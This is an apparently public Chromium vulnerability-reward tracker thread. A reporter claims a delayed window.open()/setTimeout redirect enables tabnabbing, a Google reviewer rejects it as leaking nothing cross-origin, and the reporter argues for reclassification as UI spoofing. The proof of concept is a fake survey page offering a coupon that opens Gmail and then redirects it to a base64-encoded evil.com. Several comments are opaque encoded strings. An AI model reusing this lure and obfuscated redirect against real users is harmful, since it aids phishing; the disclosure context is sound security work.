@@ -1,0 +1,235 @@
+Issue ID: 412809132
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Cross-Origin Redirect via setTimeout(), Enables Malicious Redirect, Potentially Leads to Session Hijacking, and Sophisticated  tabnabbing</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>*.google.com</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>I discovered this attack vector where a webpage can open any trusted domain (e.g., Gmail) in a new tab using window.open() and then use setTimeout() to redirect the new tab to a malicious URL after a delay. This behavior bypasses the Same-Origin Policy (SOP) protections and could be exploited for malicious purposes.
+Proof of Concept (PoC):</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Google Satisfaction Survey&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        #survey {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #f5f5f5;
+            padding: 30px;
+            border-radius: 10px;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div id=&quot;survey&quot;&gt;
+        &lt;h2&gt; Google Satisfaction Survey &lt;/h2&gt;
+        &lt;p&gt;Complete this short survey to receive a $20 coupon!&lt;/p&gt;
+
+        &lt;div style=&quot;text-align: left; margin: 20px 0;&quot;&gt;
+            &lt;p&gt;1. How satisfied are you with Newrelic?&lt;/p&gt;
+            &lt;select id=&quot;q1&quot;&gt;
+                &lt;option&gt;Very satisfied&lt;/option&gt;
+                &lt;option&gt;Satisfied&lt;/option&gt;
+                &lt;option&gt;Neutral&lt;/option&gt;
+                &lt;option&gt;Dissatisfied&lt;/option&gt;
+            &lt;/select&gt;
+        &lt;/div&gt;
+
+        &lt;button onclick=&quot;submitSurvey()&quot;&gt;Submit Survey&lt;/button&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        function submitSurvey() {
+            const temuWindow = window.open(&#39;https://mail.google.com/&#39;);<span>                      </span>
+            setTimeout(() =&gt; {<span>                      </span>
+                temuWindow.location = atob(&#39;aHR0cHM6Ly9ldmlsLmNvbS8=&#39;);<span>  </span>
+            }, 10000);<span> </span>
+
+            alert(&#39;Thank you for completing our survey&#39;);
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Steps to Reproduce:</p>
+<ol>
+<li>Open the PoC HTML file in Chrome.</li>
+<li>Ensure you&#39;re logged in to your Google account.</li>
+<li>Click the &quot;Submit Survey&quot; button.</li>
+<li>Wait for the alert dialog to appear and dismiss it.</li>
+<li>After the 10-second timeout, the new tab will redirect to evil.com.</li>
+</ol>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Impact:</p>
+<ol>
+<li>
+<p>Session Hijacking: If the trusted tab had active authentication, the redirect could capture cookies or tokens via evil.com or attacker&#39;s domain, potentially allowing the attacker to hijack the user&#39;s session and gain unauthorized access to their Google or any authenticated account on that trusted domain.</p>
+</li>
+<li>
+<p>Enhanced Tabnabbing: Attackers can replace trusted tabs with malicious clones (e.g., Keylogger, )  bypassing standard tabnabbing defenses.</p>
+</li>
+<li>
+<p>User Expectation Violation: Chrome&#39;s current behavior contradicts user intent—interaction with attacker&#39;s_domain.com should not grant control over unrelated tabs.</p>
+</li>
+</ol>
+<p>PS: I&#39;ve reported a similar issue to Mozilla, but is different, there was a unique &quot;bizarre web-compat bug&quot; that only works on firefox. The issue in Firefox was related to the handling of setTimeout() further details still in discussion.</p>
+<hr>
+<h3>The cause</h3>
+<h4>Choose the type of vulnerability</h4>
+<p>Other</p>
+<h4>Does anyone else know about this vulnerability?</h4>
+<p>No, this vulnerability is private.</p>
+<h4>Do you plan to disclose this vulnerability publicly?</h4>
+<p>I don&#39;t know</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: le...@gmail.com
+Cross-Origin Redirect via setTimeout(), Enables Malicious Redirect, Potentially Leads to Session Hijacking, and Sophisticated  tabnabbing
+
+Author: le...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: le...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: le...@gmail.com
+WVdOaU16Y3dPVEJtWXpOaVlqaGhNR1UwTURRNFltUTFaak0yWmpBMFpHVT0=
+
+Author: My other contact: 
+luxangelo@proton.me
+WVdOaU16Y3dPVEJtWXpOaVlqaGhNR1UwTURRNFltUTFaak0yWmpBMFpHVT0=
+
+Author: le...@gmail.com
+TVRBd1pXSXpPV1ZrTURNd01qWXlNRGRqTkRrelptVmxaR0l3WWpOaFlqVT0=
+
+Author: le...@gmail.com
+TkRFeU9EQTVNVE15TFRZMU1UTTFPVEF4TFMweE9EUXpOVEkxTXpBPQ==
+
+Author: aj...@google.com
+<p>Thanks for the report - simply opening a new location via the WindowProxy object does not leak any cross origin information.</p>
+
+Author: aj...@google.com
+googlers_unrestricted
+
+Author: aj...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: le...@gmail.com
+Wmpnek5ESTNZalpqWXpkbE5qZGtabU5pT1RBeVl6TXdPV0U0WldabFpqWT0=
+
+Author: Thank you for reviewing this report. While I understand the current implementation doesn't leak cross-origin information, I believe the core issue lies in UI spoofing via delayed tabnabbing which i presume might be a violation of Chrome's VRP rules regarding deceptive user interfaces.
+
+# Key Differences: Classic Tabnabbing vs. Deferred Cross-Origin Tab Weaponization (My Submission)
+
+
+|   Aspect
+|----------------------------------------------------------------------------------------------------------
+|1. Attack Flow
+|2. Trust Relationship
+|3. Timing                
+|4. Trigger Mechanism      
+|5. Browser Defenses  
+|6. Social Engineering                            
+
+|   Classic  Tabnabbing/Reverse Tabnabbing                                                                                                                        
+|----------------------------------------------------------------------------------------------------------   
+|1. Legitimate site ➔ Malicious new tab ➔ Original tab hijacked via `window.opener` 
+|2. Exploits trust in the *original tab* (e.g., LinkedIn)                                                          |
+|3. Immediate redirect when new tab loads                                              
+|4. Uses `target="_blank"` links with missing `rel=noopener`                                   
+|5. Mitigated by modern browsers via implicit `rel=noopener` ****                     
+|6. Relies on user returning to original tab after interaction with new tab           
+
+| Deferred Cross-Origin Tab Weaponization  
+|----------------------------------------------------------------------------------------------------------   
+|1. Malicious site ➔ Legitimate new tab ➔ Delayed redirect via `setTimeout()`                               
+|2. Exploits trust in the *newly opened tab* (e.g., Linkedin)                                        
+|3. Uses `window.open()` + delayed `location` override          
+|4. Delayed redirect (e.g., 1-5 minutes) to bypass user vigilance                                        
+|5. Bypasses `rel=noopener` defenses (not applicable to programmatic `window.open()`)                   
+|6. Uses fake instructions (e.g., "Keep the tab open") to maintain user focus on the malicious context 
+
+
+
+
+
+# Impact Comparison:
+
+|   Classic Tabnabbing/Reverse Tabnabbing       |   Deferred Cross-Origin Tab Weaponization                |
+|-------------------------------------------------------------------------|----------------------------------------------------------------------------------|
+| Session hijacking via original tab redirection   | Session hijacking via trusted tab replacement           |
+| Phishing via cloned login pages                         | Advanced phishing with time-delayed context shift  |
+| Relies on `window.opener`                                  | Uses direct `Window.location` control                         |
+
+
+
+Reference: https://medium.com/@ibm_ptc_security/reverse-tabnabbing-ccede451d444
+
+Deferred Cross-Origin Tab Weaponization:   
+
+1. Trusted Origin Pretense: 
+
+   - This attack weaponizes the newly opened trusted tab (eg, Gmail) instead of hijacking the original tab. This subverts user expectations and Creates false trust , as the initial interaction appears legitimate
+
+2. Bypass of Modern Defenses:
+   
+   - Classic defenses like rel=noopener and Cross-Origin Opener Policy (COOP) focus on target="_blank" links, not programmatic window.open() with user gestures. 
+     this attack leverages Chrome’s permission inheritance for user-triggered popups
+
+3. Exploitation of Browser Behavior
+
+   - User-triggered window.open() (granting initial control)
+
+   - Delayed redirect post-user interaction (evades popup blockers)
+
+VRP Relevance:
+This directly violates Section the  ("Security UI Spoofing ``") 
+`https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules`
+
+as it:
+- Creates false trust via legitimate domains
+- Exploits Browser's delayed execution model to override user intent
+- Circumvents anti-spoofing measures through temporal decoupling
+
+
+I would also like to request to reclassify this as a UI deception vulnerability rather than a SOP bypass issue. The risk may not lies on cross-origin data leakage, but in abusing Chrome's navigation permissions to create malicious UI contexts that users perceive as trusted
+
+Best Regards,
+Wmpnek5ESTNZalpqWXpkbE5qZGtabU5pT1RBeVl6TXdPV0U0WldabFpqWT0=
+
+Author: le...@gmail.com
+Thu Apr 24 2025 21:11:37 GMT+0800 (Philippine Standard Time).png
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
